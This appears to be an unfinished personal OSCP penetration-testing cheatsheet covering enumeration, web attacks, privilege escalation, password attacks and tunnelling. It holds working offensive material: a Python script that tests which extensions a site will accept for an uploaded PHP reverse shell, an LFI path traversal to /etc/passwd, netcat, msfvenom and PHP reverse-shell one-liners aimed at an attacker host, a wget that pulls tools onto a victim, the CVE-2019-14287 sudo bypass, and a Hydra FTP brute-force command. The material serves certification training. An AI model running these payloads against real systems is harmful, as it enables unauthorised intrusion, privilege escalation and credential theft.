---
description: >-
  A list of common commands along with some specific tools that are located in
  my OSCPTools repo. Taken from many sources (especially
  PayloadAllThings).............................this is not done yet.
---

# OSCP Cheatsheet

## Enumeration

### Passive

#### Google Dorks



google dorks stuff

### Active

![useful enum mindmap](.gitbook/assets/image%20%2846%29.png)

#### Common Ports

| **Port** | **Service** |
| :---: | :--- |
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 111 | RPCBIND |
| 135 | msrpc |
| 139 | netbios-ssn \([SMB](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)\) |
| 143 | IMAP |
| 443 | HTTPS |
| 445 | Microsoft-DS \(Samba/SMB\) |
| 993 | imaps |
| 995 | pop3s |
| 1723 | PPTP |
| 3306 | mySQL |
| 3389 | ms-wbt-server \(RDP\) |
| 5900 | VNC |
| 8080 | http-proxy |

#### Nmap

`nmap -A -sC -sV -O -vvv <ip>`

NmapAutomator

```text
./nmapAutomator <ip> Quick
./nmapAutomator <ip> Basic
./nmapAutomator <ip> UDP
./nmapAutomator <ip> Full
./nmapAutomator <ip> Vulns
./nmapAutomator <ip> Recon
./nmapAutomator <ip> All
```

#### Directory/File searches

dirsearch

```text
python3 dirsearch.py -u http://10.10.103.66/ -e php,html,txt
python3 dirsearch.py -u http://10.10.103.66/hiddenDirectory -e php,html,txt
```

#### Port Enumeration & Commands

#### SMB \(Server Message Block & Samba\)

`smbclient //<ip>/<share> -U <user> -p 445`

{% hint style="info" %}
**make sure to recursively download every share on the server that could have sensitive information. also try default port 139**
{% endhint %}

#### Telnet

`telnet <ip> <port>`

if no output, type on attacker:

`sudo tcpdump ip proto \\icmp -i <localIP>`

on victim:

`ping <attackerIP> -c 1`

```text
.HELP
.RUN
```

{% hint style="info" %}
**telnet might be ran on a port outside the top 1000**
{% endhint %}

#### FTP

with creds \(or weak password\):

`ftp <ip>`

`get <fileNeeded>`

#### Vulnerability Scanning

`enum4linx -A <ip>`

## Scripting

### Python

A script to test which file extensions are allowed to be uploaded to a website

```text
#!/usr/bin/env python

#plan this program from beginning to end and parsing for the library syntax

import requests #library for making HTTP requests, module that defines functions and classes that help in opening URLs
import os # library for interacting with the operating system, module provides portable way of using OS dependent function

#import OS
ip = "10.10.83.93" #ip of machine
url = f"http://{ip}:3333/internal/index.php" #login page, f is a formatted sting literal, stings that contain replacement fields delimited by {}, they're expressions evaluated at runtime

old_filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell.php" #path of reverse shell to test

# requests to upload a file
filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell"		#set to variable which is the prefix of the tested extensions, in order to quickly rename and test shell extensions
extensions = [				#tested extensions array
	".php",
	".php3",				#array[], arguements/parameters(), input {}
	".php4",
	".php5",
	".phtml",
]

#from source URL page, form action = index.php, method = post, enctype = multipart/form-data
# <input> type = file, name = file, id = file

for ext in extensions:						# for loop to keep testing which extension(s) can be uploaded, ext is counter, in is operator to match within data type

	new_filename = filename + ext 			# forms which extension of the reverse shell works
	os.rename(old_filename, new_filename)	#renames the file after testing. uses the rename() method apart of the os class. Methods are actions that objects (variables) of a class are able to perform, a noun to a verb are variables (objects) to methods. 


# HTTP has set of request methods that indicate a desired action for a given resource
# below is a POST multipart encoded file that simplifies the upload process, we know we need this from the source html
# requests to upload a file and encode URL, as they can only be sent using ASCII characters.
# per the html source of the upload page, the name of the argument that the page inputs is "file"
# below is synatx from ref page, requests sends a mutlipart form POST Body with the "file" set to the contents of new_filename, the same "file" that is input from the source page
	files = {"file": open(new_filename, "rb")}	 #r means read the file while b is the binary. rb means read binary. open () is built in function to read files in the same directory
	r = requests.post(url, files=files)	#this is the line that actually uploads the file to the url, the post method accepts the url and the intended files to be the variable files

	if "Extension not allowed" in r.text:	# if loop to test which are allowed, r.text is a text encoding guessed by the requests library 
		print(f"{ext} not allowed")			#formatted string literal in if statement, 
	else:
		print(f"{ext} seems to work")	

	old_filename = new_filename			#resets the file name after resetting from os.rename
```



### Powershell

### Bash

## Web Application Attacks

### LFI

look for “?_parameter_” in the URL source code, as the “?” is often an indication preceding a _file_ parameter that can read system files

**Path Traversal** - to know how many directories out, there must be trial and error. 

```text
http://<url>/<directory>/?file=../../../etc/passwd
```

### SQL

### XSS

### Authentication Bypass

All you need is one username to compromise the server. 

### Command Injection

## Buffer Overflows

### Linux

### Windows

## Client Side Attacks

## Locating & Fixing Public Exploits

### Manual Exploitation

#### Resources

`searchsploit`

[GTFObins](https://gtfobins.github.io/) a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

[start here](https://www.infosecmatter.com/pentesting-101-working-with-exploits/)

ppp

## File Transfers

/tmp & C:\Windows\Temp

#### Moving tools to the victim machine

start a python server `python -m SimpleHTTPServer`,  `cd /tmp` on the victim & `wget http://<attackerIP>/<locationOfTool>`

{% hint style="info" %}
**don't forget to always chmod 700 your tools**
{% endhint %}

## Antivirus Evasion

## Privilege Escalation

![Helpful Mindmap](.gitbook/assets/image%20%2830%29.png)

### Reverse Shells

#### Python

`import pty; pty.spawn("/bin/sh")`

#### Netcat

On victim:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> 4445 >/tmp/f`

On attacker:

`nc -nlvp 4445`

#### Msfvenom

Unix/Linux

`msfvenom -p cmd/unix/reverse_netcat lhost=<attackerIP> lport=4444 R`

{% hint style="info" %}
**R is flagged for the raw output of the shell**
{% endhint %}

WAR/JSP

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attackerIP> LPORT=4444 -f war > shell2.war`

#### PHP

`php -r '$sock=fsockopen("attackerIP",urPort);exec("/bin/sh -i &3 2>&3");'`

### Linux Privilege Escalation

#### Sudo

First thing, **always** check sudo permissions and [subsequent ways in](https://gtfobins.github.io/)

`sudo -l`

There exists a vulnerability in **sudo** versions &lt; **1.8.28**, CVE-2019-14287. Any user can run sudo as root using the below command, _**only works**_ if you've been granted non-root sudo permissions for the command.

`sudo -u#-1 <commandOrBin>`

#### Kernel/system information

```text
uname -a
ls -la /etc | grep release
/etc/issue
/etc/*-release
/etc/lsb-release      # Debian based
/etc/redhat-release   # Redhat based
/proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

#### Root processes

`ps aux | grep root`

#### SUID files

`find / -perm /4000 -type f -exec ls -lda {} \; 2>/dev/null`

#### Cronjobs - check for permissions and file contents

```text
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

#### Tools/Scripts

LinEnum

`./LinEnum.sh -h`

### Windows Privilege Escalation

#### Basic commands

`cls`: clears the screen

`dir`: equivalent to ls

`type`: equivalent to cat

`net user`: lists all users on system

`net user <user>`: lists permissions & info about &lt;user&gt;

Find system information first

 `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" `

List root folder

`echo %SYSTEMROOT%`

#### Tools/Scripts







## Password Attacks

#### Tools/Scripts

#### JohnTheRipper

`john`

#### Hydra

```text
hydra -t 4 -l mike -P rockyou.txt/rockyou.txt -vV 10.10.147.140 ftp

-t 4                    Number of parallel connections per target
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
ftp / protocol          Sets the protocol
```

#### Hashcat

`hashcat`

## Port Redirection & Tunneling

SSH tunnel when a username & port running the service to exploit are known

`ssh -L 10000:localhost:10000 <username>@<ip>`

If a site is blocked, traffic can be forwarded to a personal server through reverseSSH port forwarding

 `ssh -L 9000:imgur.com:80 user@example.com `



## Active Directory Attacks

## Metasploit

## Misc

### Guides

### Practice Resources

### Methodology



